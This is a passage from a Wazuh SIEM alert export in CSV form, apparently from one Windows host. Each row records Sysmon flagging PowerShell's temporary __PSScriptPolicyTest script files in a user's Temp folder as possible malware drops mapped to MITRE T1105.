User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:14:31.688034200Z,58419,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,47,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:14:32.815",EventChannel,1732961672.3535472,"Nov 30, 2024 @ 10:14:32.815", , , , , , , , , , , , ,4168, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E587-674A-F907-000000000D00},2024-11-30 10:14:31.678, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0fpmjvmz.uja.ps1,2024-11-30 10:14:31.678, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,2vqcfJMBRlc-D5DFjiC3,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:27:29.489
ProcessGuid: {15959494-E891-674A-0B08-000000000D00}
ProcessId: 5384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_rtknbbqu.5zj.ps1
CreationUtcTime: 2024-11-30 10:27:29.489
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:27:29.502891600Z,58652,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,62,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:27:30.633",EventChannel,1732962450.3584613,"Nov 30, 2024 @ 10:27:30.633", , , , , , , , , , , , ,5384, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E891-674A-0B08-000000000D00},2024-11-30 10:27:29.489, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rtknbbqu.5zj.ps1,2024-11-30 10:27:29.489, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,2_qdfJMBRlc-D5DFPiCC,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:28:16.554
ProcessGuid: {15959494-E8C0-674A-0D08-000000000D00}
ProcessId: 7476
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_gi4t1piy.t2l.ps1
CreationUtcTime: 2024-11-30 10:28:16.554
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:28:16.563221900Z,58667,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,63,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:28:17.674",EventChannel,1732962497.3587624,"Nov 30, 2024 @ 10:28:17.674", , , , , , , , , , , , ,7476, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E8C0-674A-0D08-000000000D00},2024-11-30 10:28:16.554, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gi4t1piy.t2l.ps1,2024-11-30 10:28:16.554, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,q_qEfJMBRlc-D5DFkSDJ,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:01:16.519
ProcessGuid: {15959494-E26C-674A-E807-000000000D00}
ProcessId: 396
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_tdjrv5nn.coh.ps1
CreationUtcTime: 2024-11-30 10:01:16.519
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:01:16.534297200Z,58186,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,32,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:01:17.661",EventChannel,1732960877.3477009,"Nov 30, 2024 @ 10:01:17.661", , , , , , , , , , , , ,396, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E26C-674A-E807-000000000D00},2024-11-30 10:01:16.519, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tdjrv5nn.coh.ps1,2024-11-30 10:01:16.519, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,rPqFfJMBRlc-D5DFQSCU,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:01:56.534
ProcessGuid: {15959494-E294-674A-E907-000000000D00}
ProcessId: 6084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ejz2xyqn.4nn.ps1
CreationUtcTime: 2024-11-30 10:01:56.534
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:01:56.540374300Z,58201,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,33,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:01:57.683",EventChannel,1732960917.3480016,"Nov 30, 2024 @ 10:01:57.683", , , , , , , , , , , , ,6084, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E294-674A-E907-000000000D00},2024-11-30 10:01:56.534, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ejz2xyqn.4nn.ps1,2024-11-30 10:01:56.534, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
